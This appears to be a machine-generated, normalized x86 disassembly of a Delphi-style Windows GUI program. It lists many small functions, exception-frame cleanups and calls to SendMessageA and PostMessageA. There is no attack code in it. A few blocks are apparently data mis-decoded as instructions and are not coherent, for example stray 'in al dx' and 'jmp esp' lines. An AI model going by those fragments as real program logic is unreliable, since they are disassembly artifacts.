mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x90 ] eax
sub_456a24
push esi
mov si 0xffef
call sub_403350
pop esi
retn
sub_456ac5
jmp sub_4038d0
sub_456acc
pop ebp
retn
sub_456ad0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
sub_456b39
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax + 0x1004581 ] dh
add bh bh
jmp esp
sub_456c70
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_456e49
jmp sub_4038d0
sub_456e50
pop ebx
pop ecx
pop ebp
retn
sub_456e54
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_456e5c
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45702c
sub_456f09
jmp sub_4038d0
sub_456f10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403154
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4570bf
jmp sub_4038d0
sub_4570c6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45715e
jmp sub_4038d0
sub_457165
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457182
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_45717b
jmp sub_4038d0
sub_457182
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403350
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45723b
jmp sub_4038d0
sub_457242
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457248
or edx 0xffffffff
call sub_4571bc
retn
sub_457657
jmp sub_4038d0
sub_45765e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45767b
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_457674
jmp sub_4038d0
sub_45767b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457698
mov eax [ ebp - 0x4 ]
call sub_458190
retn
sub_457691
jmp sub_4038d0
sub_457698
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45789c
jmp sub_4038d0
sub_4578a3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4578a8
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403350
sub_4578c0
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416efc
pop ebx
retn
sub_457964
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418454
sub_457a7b
jmp sub_4038d0
sub_457a82
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_457a98
jmp sub_4038d0
sub_457daa
jmp sub_4038d0
sub_457db1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457dce
mov eax [ ebp - 0x10 ]
call sub_403154
retn
sub_457dc7
jmp sub_4038d0
sub_457dce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457deb
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_457de4
jmp sub_4038d0
sub_457deb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457e54
jmp sub_4038d0
sub_457f6d
jmp sub_4038d0
sub_457f8a
jmp sub_4038d0
sub_458142
jmp sub_4038d0
sub_458149
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45818c
inc [ eax + 0x5c ]
retn
sub_458190
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403350
sub_4581e4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_458221
jmp sub_4038d0
sub_458228
pop ebp
retn
sub_45822c
sub [ rw-data ] 0x1
retn
sub_459137
jmp [ eax + eax ]
sub_459194
mov eax [ esp + 0x8 ]
retn
sub_45919c
push ebx
mov ebx eax
call sub_459194
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
jmp sub_403908
sub_4591b8
pop ebx
retn
sub_459431
jmp sub_4038d0
sub_459438
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459583
jmp sub_4038d0
sub_45958a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4595a0
push ebx
mov eax [ rw-data ]
call sub_418b08
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418adc
mov eax ebx
pop ebx
retn
sub_459728
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_459744
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_459e3f
jmp sub_4038d0
sub_459e46
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459f3e
jmp sub_4038d0
sub_459f45
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a368
jmp sub_4038d0
sub_45a36f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45a81b
jmp sub_4038d0
sub_45acbc
jmp sub_4038d0
sub_45acc3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b127
jmp sub_4038d0
sub_45b5e4
jmp sub_4038d0
sub_45b5eb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b996
jmp sub_4038d0
sub_45b99d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45b9ab
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45bb58
mov eax [ r-xdata ]
retn
sub_45bb94
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45bba8
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45bbb8
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45bbc8
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45bec4
mov edx eax
sub_45bc60
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403304
mov edx esi
call sub_45bbe0
pop esi
pop ebx
retn
sub_45bcdc
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45bec4
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41860c
mov ecx eax
sub_45c0b4
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45c11c
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45c4c4
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45c4f8
sub_45c4f8
mov edx sub_45c4d0
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_459620
retn
sub_45c6e2
jmp sub_4038d0
sub_45c6e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb80
jmp sub_4038d0
sub_45cbbf
jmp sub_4038d0
sub_45cbc6
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cd64
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45cea0
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403350
pop esi
pop ebp
retn 0x8
sub_45cebc
mov eax [ eax + 0x34 ]
call sub_45a0f4
retn
sub_45cec8
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403350
pop esi
retn
sub_45cf04
push ebx
mov ecx sub_45cedc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_459620
pop ebx
retn
sub_45d138
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45d14c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_40361c#8
jmp sub_40361c
sub_45d383
jmp sub_4038d0
sub_45d3ae
jmp sub_4038d0
sub_45d3b5
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45d3cc
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45d5b4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_45cf04
sub_45d634
jmp sub_4038d0
sub_45d678
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45d690
push ebx
mov ebx eax
mov eax ebx
call sub_42141c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45d6e2
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45cf04
sub_45d758
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45d8a1
jmp sub_4038d0
sub_45d8a8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45dae8
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45daf8
sub_45db4c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45db5c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45db6c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45db7c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45db8c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45dc04
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_459f4c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_459f4c
retn
sub_45dc20
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_459f4c
sub_45dc68
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45cebc
retn
mov eax edx
retn
sub_45dca2
jmp sub_40361c
sub_45dca7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e00d
jmp sub_4038d0
sub_45e014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403154
retn
sub_45e02a
jmp sub_4038d0
sub_45e12b
jmp sub_4038d0
sub_45e132
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e14f
mov eax [ ebp - 0x14 ]
call sub_403154
retn
sub_45e148
jmp sub_4038d0
sub_45e16d
jmp sub_4038d0
sub_45e1f7
jmp sub_4038d0
sub_45e1fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e230
push ebx
mov ebx eax
mov eax ebx
call sub_41874c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_4221cc
sub_45e2f4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45e308
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45e310
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45e6d5
jmp sub_4038d0
sub_45e6dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45e7dc
jmp sub_4038d0
sub_45e7e3
pop ebp
retn
sub_45f35b
[ edi + edi * 8 - 0x2f002f ]
sub_45f362
stc
jmp esp
sub_460624
mov eax [ rw-data ]
retn
sub_46062c
mov [ rw-data ] eax
retn
sub_460774
jmp sub_40361c
sub_4607ab
jmp sub_4038d0
sub_4607b2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460980
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42205c
pop ebp
retn 0x8
sub_460994
call sub_4220f4
retn
sub_460ad6
jmp sub_4038d0
sub_460add
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460b81
jmp sub_4038d0
sub_460b88
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460c18
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_461344
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4619f0
sub_461360
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_461344
sub_461480
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4619f0
sub_461498
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4619f0
sub_4614b0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4619f0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4614dc
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4614e8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4619f0
retn
sub_4617c8
push ebx
mov ebx edx
mov edx ebx
call sub_44d5a8
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_461838
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_461960
jmp sub_4038d0
sub_461967
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461970
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_460d7c
mov eax [ ebx + 0x20c ]
call sub_460d7c
sub_4619d0
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4619e0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_461adb
jmp sub_4038d0
sub_461ae8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_461b00
sub_461d1c
retn
sub_461d8a
jmp sub_4038d0
sub_461dc9
jmp sub_4038d0
sub_461dfc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44eaa0
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_461008
retn
sub_461e20
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44eac0
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_461008
retn
sub_461f15
jmp sub_4038d0
sub_461f1c
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460c70
mov eax [ ebp - 0x4 ]
call sub_4619f0
sub_462050
jmp sub_4038d0
sub_462088
jmp sub_4038d0
sub_46208f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620af
lea eax [ ebp - 0x114 ]
call sub_403f50
retn
sub_4620a8
jmp sub_4038d0
sub_4620af
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4623b6
jmp sub_4038d0
sub_4623bd
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034f0
sub_462411
jmp sub_40361c
sub_46248d
jmp sub_40361c
sub_462492
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46284a
jmp sub_4038d0
sub_462851
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46292c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc68
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_462944
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46297c
mov edx eax
mov eax esi
call sub_41ee80
pop esi
pop ebx
retn
sub_462960
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463d20
mov edx eax
mov eax esi
call sub_41ee80
pop esi
pop ebx
retn
sub_46297c
push ebx
mov ebx eax
mov eax ebx
call sub_4639c0
mov edx r-xdata
call sub_424e34
pop ebx
retn
sub_462a80
push ebx
mov ebx eax
mov eax ebx
call sub_462a90
xor al 0x1
pop ebx
retn
sub_462a90
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_462aec
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_462b0c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_462b2c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_462e25
jmp sub_4038d0
sub_462e2c
pop ecx
pop ebp
retn
sub_462e30
xor eax eax
retn
sub_463108
jmp sub_4038d0
sub_46310f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_463125
jmp sub_4038d0
sub_46320f
jmp sub_4038d0
sub_463216
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463233
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub_46322c
jmp sub_4038d0
sub_463253
jmp sub_4038d0
sub_46353e
jmp sub_4038d0
sub_4636d1
jmp sub_4038d0
sub_4639c0
mov eax [ eax + 0x238 ]
retn
sub_4639c8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4639d4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_463d12
jmp sub_4038d0
sub_463d19
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463d20
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_463d68
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44dcbc
sub_463d84
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_463dc0
push ebx
mov ebx eax
mov eax ebx
call sub_44fc50
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4247f4
sub_463e44
push ebx
mov ebx eax
mov eax ebx
call sub_44fc78
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_424ed8
sub_463e64
push ebx
mov ebx eax
mov eax ebx
call sub_463a84
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_463b4c
pop ebx
retn
sub_464691
lea eax [ ebp - 0xb4 ]
call sub_403f50
retn
sub_46469d
jmp sub_4038d0
j_sub_464691
jmp sub_464691
sub_4646a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4647fc
jmp sub_4038d0
sub_464803
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464ae8
jmp sub_4038d0
sub_464aef
mov eax [ rw-data ]
call sub_4673a0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464b06
add [ eax ] al
retn
sub_464d64
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_464d84
mov eax [ eax + 0x240 ]
call sub_42907c
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_469140
sub_464e2b
jmp sub_4038d0
sub_464e32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e55
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424eb0
retn
sub_464e4e
jmp sub_4038d0
sub_464e55
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464d84
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_46527c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45d070
sub_465367
jmp sub_4038d0
sub_46536e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465374
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_464b5c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4653cc
call sub_4660f4
retn
sub_465819
jmp sub_4038d0
sub_465820
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40361c#7
jmp sub_40361c
j_sub_40361c#6
jmp sub_40361c
sub_465fb1
jmp sub_4038d0
sub_465fb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fd5
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_465fce
jmp sub_4038d0
sub_465fd5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465fdc
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42907c
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_462a24
sub_465ffc
call sub_403154
retn
sub_466054
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4660ba
jmp sub_4038d0
sub_466268
jmp sub_40361c
sub_466294
xor edx edx
call sub_462d88
retn
sub_46629c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_462d88
mov eax ebx
call sub_44a080
pop ebx
retn
sub_466322
jmp sub_4038d0
sub_466329
pop ebx
pop ecx
pop ebp
retn
sub_466330
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_45071c
push eax
call PostMessageA
pop ebx
retn
sub_466534
jmp sub_4038d0
sub_4665d5
jmp sub_4038d0
sub_4665df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665fe
mov eax [ rw-data ]
call sub_468818
retn
sub_4665f7
jmp sub_4038d0
sub_4665fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46661b
lea eax [ ebp - 0x20 ]
call sub_403f50
retn
sub_466614
jmp sub_4038d0
sub_46661b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4666fc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44922c
retn
mov edx eax
mov eax [ rw-data ]
call sub_467e6c
retn
sub_466a80
mov edx eax
mov eax [ rw-data ]
call sub_46988c
mov al 0x1
retn
sub_466b68
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_466a90
sub_466b7c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_466a90
sub_466b90
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_466a90
sub_466ba4
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_466a90
sub_466bb8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_466d23
jmp sub_4038d0
sub_466d2a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466d30
push ebx
mov ebx eax
mov eax ebx
call sub_44f034
mov eax ebx
call sub_44f1b8
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_466330
sub_466fa6
jmp sub_4038d0
sub_466fad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466fb4
push ebx
mov ebx edx
mov edx ebx
call sub_44f49c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_449334
pop ebx
retn
sub_467008
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_467070
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_467020
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_467070
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46703c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_467070
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_467054
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_467070
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4672f0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4672fc
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467308
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467314
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467320
